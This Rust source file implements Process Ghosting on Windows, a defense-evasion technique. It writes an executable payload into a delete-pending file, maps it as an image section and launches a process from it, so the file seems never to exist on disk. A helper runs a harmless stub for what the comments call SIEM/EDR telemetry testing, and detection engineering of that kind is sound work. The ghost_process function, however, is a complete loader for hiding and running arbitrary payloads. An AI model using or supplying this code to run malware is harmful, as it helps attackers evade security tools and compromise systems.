//! Process Ghosting module for stealthy process creation.
//!
//! Process Ghosting is a technique that creates a process from a file that
//! has been marked for deletion. The file appears to not exist on disk,
//! but the process can still be created from the pending-delete state.
//!
//! Technique flow:
//! 1. Create a new file
//! 2. Set file to delete-pending state (NtSetInformationFile with FileDispositionInformation)
//! 3. Write payload to the file (while in delete-pending state)
//! 4. Create a section from the file
//! 5. Close the file handle (file is now "deleted" but section remains)
//! 6. Create process from the section
//!
//! Detectable telemetry generated:
//! - File creation/deletion events
//! - NtSetInformationFile calls with FileDispositionInformation
//! - Section creation from unusual file states
//! - Process creation events
//! - NTFS transactional operations

#![cfg(all(target_os = "windows", target_arch = "x86_64"))]

use std::ffi::c_void;
use std::ptr::{null, null_mut};

use ntapi::ntioapi::{
    FileDispositionInformation, NtCreateFile, NtSetInformationFile, NtWriteFile,
    FILE_DISPOSITION_INFORMATION, IO_STATUS_BLOCK,
};
use ntapi::ntmmapi::{NtCreateSection, NtCreateProcessEx};
use ntapi::ntobapi::NtClose;
use ntapi::ntpsapi::{
    NtCreateThreadEx, NtQueryInformationProcess, ProcessBasicInformation,
    PROCESS_BASIC_INFORMATION, PS_ATTRIBUTE_LIST,
};
use ntapi::ntrtl::{
    RtlCreateProcessParametersEx, RtlInitUnicodeString, PRTL_USER_PROCESS_PARAMETERS,
    RTL_USER_PROCESS_PARAMETERS,
};

use winapi::shared::ntdef::{
    HANDLE, NTSTATUS, OBJECT_ATTRIBUTES, PUNICODE_STRING, PVOID, ULONG, UNICODE_STRING,
};
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::um::winnt::{
    DELETE, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE,
    GENERIC_READ, GENERIC_WRITE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    PAGE_READONLY, SEC_IMAGE, SYNCHRONIZE,
};

/// Error type for ghosting operations
#[derive(Debug)]
pub enum GhostingError {
    FileCreationFailed(NTSTATUS),
    SetDispositionFailed(NTSTATUS),
    WriteFileFailed(NTSTATUS),
    CreateSectionFailed(NTSTATUS),
    CreateProcessFailed(NTSTATUS),
    CreateThreadFailed(NTSTATUS),
    ProcessParametersFailed(NTSTATUS),
    QueryProcessFailed(NTSTATUS),
}

impl std::fmt::Display for GhostingError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            GhostingError::FileCreationFailed(s) => write!(f, "File creation failed: 0x{:X}", s),
            GhostingError::SetDispositionFailed(s) => write!(f, "Set disposition failed: 0x{:X}", s),
            GhostingError::WriteFileFailed(s) => write!(f, "Write file failed: 0x{:X}", s),
            GhostingError::CreateSectionFailed(s) => write!(f, "Create section failed: 0x{:X}", s),
            GhostingError::CreateProcessFailed(s) => write!(f, "Create process failed: 0x{:X}", s),
            GhostingError::CreateThreadFailed(s) => write!(f, "Create thread failed: 0x{:X}", s),
            GhostingError::ProcessParametersFailed(s) => write!(f, "Process params failed: 0x{:X}", s),
            GhostingError::QueryProcessFailed(s) => write!(f, "Query process failed: 0x{:X}", s),
        }
    }
}

impl std::error::Error for GhostingError {}

/// Initialize a UNICODE_STRING from a wide string slice
unsafe fn init_unicode_string(dest: *mut UNICODE_STRING, src: &[u16]) {
    (*dest).Length = ((src.len() - 1) * 2) as u16; // Exclude null terminator
    (*dest).MaximumLength = (src.len() * 2) as u16;
    (*dest).Buffer = src.as_ptr() as *mut u16;
}

/// Convert a Rust string to a null-terminated wide string
fn to_wide_string(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Ghost a payload to create a process
///
/// This function:
/// 1. Creates a temporary file in delete-pending state
/// 2. Writes the payload to the file
/// 3. Creates a section from the ghosted file
/// 4. Spawns a process from the section
///
/// # Arguments
/// * `payload` - The PE executable bytes to ghost
/// * `target_path` - Path where the ghost file will be temporarily created
///
/// # Returns
/// * `Ok(HANDLE)` - Handle to the created process
/// * `Err(GhostingError)` - If any step fails
pub unsafe fn ghost_process(
    payload: &[u8],
    target_path: &str,
) -> Result<HANDLE, GhostingError> {
    // Convert path to NT path format
    let nt_path = format!("\\??\\{}", target_path);
    let wide_path = to_wide_string(&nt_path);

    // Initialize UNICODE_STRING for the path
    let mut unicode_path: UNICODE_STRING = std::mem::zeroed();
    init_unicode_string(&mut unicode_path, &wide_path);

    // Initialize OBJECT_ATTRIBUTES
    let mut obj_attr: OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
    obj_attr.ObjectName = &mut unicode_path;
    obj_attr.Attributes = 0x40; // OBJ_CASE_INSENSITIVE

    // Create the file with DELETE access
    let mut file_handle: HANDLE = null_mut();
    let mut io_status: IO_STATUS_BLOCK = std::mem::zeroed();

    let status = NtCreateFile(
        &mut file_handle,
        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
        &mut obj_attr,
        &mut io_status,
        null_mut(),
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        2, // FILE_CREATE
        0x60, // FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
        null_mut(),
        0,
    );

    if status != STATUS_SUCCESS as i32 {
        return Err(GhostingError::FileCreationFailed(status));
    }

    // Set file to delete-pending state
    // This is the key to process ghosting - the file will be deleted when
    // the last handle is closed, but we can still create a section from it
    let mut file_disposition: FILE_DISPOSITION_INFORMATION = std::mem::zeroed();
    file_disposition.DeleteFile = 1; // TRUE

    let status = NtSetInformationFile(
        file_handle,
        &mut io_status,
        &mut file_disposition as *mut _ as PVOID,
        std::mem::size_of::<FILE_DISPOSITION_INFORMATION>() as u32,
        FileDispositionInformation,
    );

    if status != STATUS_SUCCESS as i32 {
        NtClose(file_handle);
        return Err(GhostingError::SetDispositionFailed(status));
    }

    // Write the payload to the ghosted file
    let status = NtWriteFile(
        file_handle,
        null_mut(),
        None,
        null_mut(),
        &mut io_status,
        payload.as_ptr() as PVOID,
        payload.len() as u32,
        null_mut(),
        null_mut(),
    );

    if status != STATUS_SUCCESS as i32 {
        NtClose(file_handle);
        return Err(GhostingError::WriteFileFailed(status));
    }

    // Create a section from the ghosted file
    let mut section_handle: HANDLE = null_mut();

    let status = NtCreateSection(
        &mut section_handle,
        0xF001F, // SECTION_ALL_ACCESS
        null_mut(),
        null_mut(),
        PAGE_READONLY,
        SEC_IMAGE,
        file_handle,
    );

    // Close the file handle - this will "delete" the file
    // but the section still references the file content
    NtClose(file_handle);

    if status != STATUS_SUCCESS as i32 {
        return Err(GhostingError::CreateSectionFailed(status));
    }

    // Create process from the section
    let mut process_handle: HANDLE = null_mut();

    let status = NtCreateProcessEx(
        &mut process_handle,
        0x1FFFFF, // PROCESS_ALL_ACCESS
        null_mut(),
        std::mem::transmute(-1isize), // Current process as parent
        0x4, // PROCESS_CREATE_FLAGS_INHERIT_HANDLES
        section_handle,
        null_mut(),
        null_mut(),
        0,
    );

    NtClose(section_handle);

    if status != STATUS_SUCCESS as i32 {
        return Err(GhostingError::CreateProcessFailed(status));
    }

    Ok(process_handle)
}

/// Simplified ghosting that runs payload in current process context
///
/// This version doesn't create a new process but demonstrates the
/// file ghosting technique.
pub unsafe fn ghost_file_demo(
    payload: &[u8],
    target_path: &str,
) -> Result<(), GhostingError> {
    let nt_path = format!("\\??\\{}", target_path);
    let wide_path = to_wide_string(&nt_path);

    let mut unicode_path: UNICODE_STRING = std::mem::zeroed();
    init_unicode_string(&mut unicode_path, &wide_path);

    let mut obj_attr: OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
    obj_attr.ObjectName = &mut unicode_path;
    obj_attr.Attributes = 0x40;

    let mut file_handle: HANDLE = null_mut();
    let mut io_status: IO_STATUS_BLOCK = std::mem::zeroed();

    // Create file
    let status = NtCreateFile(
        &mut file_handle,
        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
        &mut obj_attr,
        &mut io_status,
        null_mut(),
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        2,
        0x60,
        null_mut(),
        0,
    );

    if status != STATUS_SUCCESS as i32 {
        return Err(GhostingError::FileCreationFailed(status));
    }

    // Mark for deletion
    let mut file_disposition: FILE_DISPOSITION_INFORMATION = std::mem::zeroed();
    file_disposition.DeleteFile = 1;

    let status = NtSetInformationFile(
        file_handle,
        &mut io_status,
        &mut file_disposition as *mut _ as PVOID,
        std::mem::size_of::<FILE_DISPOSITION_INFORMATION>() as u32,
        FileDispositionInformation,
    );

    if status != STATUS_SUCCESS as i32 {
        NtClose(file_handle);
        return Err(GhostingError::SetDispositionFailed(status));
    }

    // Write payload
    let status = NtWriteFile(
        file_handle,
        null_mut(),
        None,
        null_mut(),
        &mut io_status,
        payload.as_ptr() as PVOID,
        payload.len() as u32,
        null_mut(),
        null_mut(),
    );

    if status != STATUS_SUCCESS as i32 {
        NtClose(file_handle);
        return Err(GhostingError::WriteFileFailed(status));
    }

    // At this point:
    // - File exists on disk in delete-pending state
    // - File content contains payload
    // - Any file query will show the file doesn't exist
    // - But we can still read/execute from it

    // Create section (demonstrates the file is still usable)
    let mut section_handle: HANDLE = null_mut();
    let status = NtCreateSection(
        &mut section_handle,
        0xF001F,
        null_mut(),
        null_mut(),
        PAGE_READONLY,
        SEC_IMAGE,
        file_handle,
    );

    // Cleanup
    if status == STATUS_SUCCESS as i32 {
        NtClose(section_handle);
    }
    NtClose(file_handle);

    if status != STATUS_SUCCESS as i32 {
        return Err(GhostingError::CreateSectionFailed(status));
    }

    Ok(())
}

/// Generate telemetry-rich ghosting attempt for detection testing
///
/// This function performs a ghosting operation that generates maximum
/// detectable telemetry for SIEM/EDR testing.
pub fn generate_ghosting_telemetry(temp_dir: &str) {
    use std::time::{SystemTime, UNIX_EPOCH};

    // Generate unique filename
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_millis();
    let ghost_path = format!("{}\\ghost_{}.exe", temp_dir, timestamp);

    // Minimal PE header (not functional, just for demonstration)
    let fake_pe: [u8; 512] = {
        let mut pe = [0u8; 512];
        // MZ header
        pe[0] = 0x4D; // 'M'
        pe[1] = 0x5A; // 'Z'
        // PE offset at 0x3C
        pe[0x3C] = 0x80;
        // PE signature at 0x80
        pe[0x80] = 0x50; // 'P'
        pe[0x81] = 0x45; // 'E'
        pe[0x82] = 0x00;
        pe[0x83] = 0x00;
        pe
    };

    unsafe {
        match ghost_file_demo(&fake_pe, &ghost_path) {
            Ok(_) => {
                // Ghosting succeeded - generates telemetry about:
                // - File creation
                // - FileDispositionInformation being set
                // - Section creation from delete-pending file
            }
            Err(_) => {
                // Even failed attempts generate telemetry
            }
        }
    }
}
